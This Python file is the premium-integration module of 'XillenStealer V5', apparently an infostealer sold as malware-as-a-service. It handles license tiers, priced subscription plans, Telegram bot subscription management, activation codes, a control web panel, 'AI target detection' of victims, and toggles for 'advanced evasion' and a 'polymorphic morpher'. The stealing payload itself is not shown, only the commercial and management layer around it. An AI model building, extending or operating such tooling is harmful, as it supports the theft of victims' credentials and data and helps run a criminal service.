import json
import os
import sys
from datetime import datetime

# Add core modules to path
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

from core.licensing.premium_licensing import licensing_system, check_license, has_feature, get_limit
from core.ai.target_detection import ai_target_detection, enable_ai_detection, analyze_target
from core.cloud.panel_manager import cloud_panel, enable_cloud_panel
from core.subscriptions.telegram_manager import telegram_subscription_manager, setup_telegram_bot

class PremiumIntegration:
    def __init__(self):
        self.license_info = None
        self.ai_enabled = False
        self.cloud_enabled = False
        self.telegram_bot_enabled = False
        
    def initialize_premium(self):
        """Initialize premium features"""
        print("Initializing XillenStealer V5 Premium...")
        
        try:
            # Check license
            self.license_info = check_license()
            print(f"License: {self.license_info['type']}")
            
            # Enable features based on license
            if self.license_info['type'] != 'FREE':
                self._enable_premium_features()
            
            print("Premium initialization complete!")
            return True
            
        except Exception as e:
            print(f"Premium initialization error: {e}")
            return False
    
    def _enable_premium_features(self):
        """Enable premium features based on license"""
        try:
            # Enable AI detection if available
            if has_feature('ai_target_detection'):
                enable_ai_detection()
                self.ai_enabled = True
                print("AI Target Detection enabled!")
            
            # Enable cloud panel if available
            if has_feature('cloud_panel'):
                # This would be enabled with API key
                print("Cloud Panel available!")
            
            # Enable advanced features
            if has_feature('advanced_evasion'):
                print("Advanced Evasion enabled!")
            
            if has_feature('polymorphic_morpher'):
                print("Polymorphic Morpher enabled!")
                
        except Exception as e:
            print(f"Premium features error: {e}")
    
    def setup_telegram_bot(self, bot_token, webhook_url=None):
        """Setup Telegram bot for subscription management"""
        try:
            if setup_telegram_bot(bot_token, webhook_url):
                self.telegram_bot_enabled = True
                print("Telegram Bot setup successful!")
                return True
            else:
                print("Telegram Bot setup failed!")
                return False
                
        except Exception as e:
            print(f"Telegram Bot error: {e}")
            return False
    
    def setup_cloud_panel(self, api_key, user_id):
        """Setup cloud panel"""
        try:
            if enable_cloud_panel(api_key, user_id):
                self.cloud_enabled = True
                print("Cloud Panel setup successful!")
                return True
            else:
                print("Cloud Panel setup failed!")
                return False
                
        except Exception as e:
            print(f"Cloud Panel error: {e}")
            return False
    
    def create_activation_code(self, subscription_type, duration_days, max_uses=1):
        """Create activation code"""
        try:
            from core.subscriptions.telegram_manager import create_activation_code
            code = create_activation_code(subscription_type, duration_days, max_uses)
            
            if code:
                print(f"Activation code created: {code}")
                return code
            else:
                print("Failed to create activation code!")
                return None
                
        except Exception as e:
            print(f"Create code error: {e}")
            return None
    
    def get_premium_stats(self):
        """Get premium statistics"""
        try:
            stats = {
                'license': self.license_info,
                'ai_enabled': self.ai_enabled,
                'cloud_enabled': self.cloud_enabled,
                'telegram_bot_enabled': self.telegram_bot_enabled
            }
            
            # Add AI stats if enabled
            if self.ai_enabled:
                stats['ai_stats'] = ai_target_detection.get_ai_statistics()
            
            # Add cloud stats if enabled
            if self.cloud_enabled:
                stats['cloud_stats'] = cloud_panel.get_cloud_status()
            
            # Add subscription stats
            try:
                from core.subscriptions.telegram_manager import get_subscription_stats
                stats['subscription_stats'] = get_subscription_stats()
            except:
                stats['subscription_stats'] = {}
            
            return stats
            
        except Exception as e:
            print(f"Stats error: {e}")
            return {}
    
    def analyze_target_premium(self, target_data):
        """Analyze target with premium features"""
        try:
            result = {
                'basic_analysis': target_data,
                'premium_features': {}
            }
            
            # AI analysis if enabled
            if self.ai_enabled:
                ai_result = analyze_target(target_data)
                result['premium_features']['ai_analysis'] = ai_result
            
            # Cloud analysis if enabled
            if self.cloud_enabled:
                # This would send data to cloud for analysis
                result['premium_features']['cloud_analysis'] = {
                    'status': 'cloud_analysis_available',
                    'timestamp': datetime.now().isoformat()
                }
            
            return result
            
        except Exception as e:
            print(f"Premium analysis error: {e}")
            return target_data
    
    def check_license_limits(self, operation_type):
        """Check if operation is within license limits"""
        try:
            if self.license_info['type'] == 'FREE':
                # Check free limits
                if operation_type == 'builds':
                    return True  # Would check actual build count
                elif operation_type == 'logs':
                    return True  # Would check actual log count
                else:
                    return True
            
            # Premium users have higher limits
            return True
            
        except Exception as e:
            print(f"License check error: {e}")
            return False
    
    def upgrade_license(self, new_type):
        """Upgrade license type"""
        try:
            from core.licensing.premium_licensing import upgrade_license
            
            if upgrade_license(new_type):
                # Reinitialize premium features
                self.initialize_premium()
                print(f"Upgraded to {new_type} successfully!")
                return True
            else:
                print(f"Upgrade to {new_type} failed!")
                return False
                
        except Exception as e:
            print(f"Upgrade error: {e}")
            return False
    
    def get_available_plans(self):
        """Get available subscription plans"""
        try:
            from core.licensing.premium_licensing import get_available_plans
            return get_available_plans()
            
        except Exception as e:
            print(f"Get plans error: {e}")
            return {}
    
    def start_web_panel(self, host='127.0.0.1', port=5000):
        """Start web panel server"""
        try:
            from core.subscriptions.web_panel_server import start_web_panel
            start_web_panel(host=host, port=port, debug=False)
            
        except Exception as e:
            print(f"Web panel error: {e}")

# Global instance
premium_integration = PremiumIntegration()

def initialize_premium():
    """Initialize premium features"""
    return premium_integration.initialize_premium()

def setup_telegram_bot(bot_token, webhook_url=None):
    """Setup Telegram bot"""
    return premium_integration.setup_telegram_bot(bot_token, webhook_url)

def setup_cloud_panel(api_key, user_id):
    """Setup cloud panel"""
    return premium_integration.setup_cloud_panel(api_key, user_id)

def create_activation_code(subscription_type, duration_days, max_uses=1):
    """Create activation code"""
    return premium_integration.create_activation_code(subscription_type, duration_days, max_uses)

def get_premium_stats():
    """Get premium statistics"""
    return premium_integration.get_premium_stats()

def analyze_target_premium(target_data):
    """Analyze target with premium features"""
    return premium_integration.analyze_target_premium(target_data)

def check_license_limits(operation_type):
    """Check license limits"""
    return premium_integration.check_license_limits(operation_type)

def upgrade_license(new_type):
    """Upgrade license"""
    return premium_integration.upgrade_license(new_type)

def get_available_plans():
    """Get available plans"""
    return premium_integration.get_available_plans()

def start_web_panel(host='127.0.0.1', port=5000):
    """Start web panel"""
    return premium_integration.start_web_panel(host, port)

if __name__ == "__main__":
    print("XillenStealer V5 - Premium Integration")
    print("=" * 60)
    
    # Initialize premium
    if initialize_premium():
        print("Premium initialization successful!")
        
        # Show available plans
        plans = get_available_plans()
        print("\nAvailable Plans:")
        for plan_name, plan_info in plans.items():
            price = plan_info.get('price', 0)
            period = plan_info.get('period', '')
            print(f"  {plan_name}: ${price}/{period}")
        
        # Show current stats
        stats = get_premium_stats()
        print(f"\nCurrent Stats: {stats}")
        
        # Create test activation codes
        print("\nCreating test activation codes...")
        
        basic_code = create_activation_code("BASIC", 30, 1)
        pro_code = create_activation_code("PRO", 30, 1)
        enterprise_code = create_activation_code("ENTERPRISE", 30, 1)
        
        print(f"BASIC Code: {basic_code}")
        print(f"PRO Code: {pro_code}")
        print(f"ENTERPRISE Code: {enterprise_code}")
        
        # Start web panel
        print("\nStarting Web Panel...")
        print("URL: http://127.0.0.1:5000")
        print("Press Ctrl+C to stop")
        
        try:
            start_web_panel()
        except KeyboardInterrupt:
            print("\nWeb Panel stopped!")
    else:
        print("Premium initialization failed!")
